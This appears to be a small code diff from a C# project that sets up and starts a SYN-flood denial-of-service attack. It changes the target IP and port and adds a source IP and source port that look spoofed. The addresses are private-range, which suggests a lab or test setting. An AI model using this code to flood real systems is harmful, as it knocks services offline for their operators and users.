@@ -7,8 +7,10 @@ DosAttack attack = new(new()
 {
     Size = 1,
     DosType = DosType.SynFlood,
-    TargetIp = "172.28.239.230",
-    TargetPort = 80,
+    SourcePort = 60270,
+    TargetIp = "172.20.71.194",
+    SourceIp = "192.168.86.150",
+    TargetPort = 9999,
 });
 
 await attack.Start();
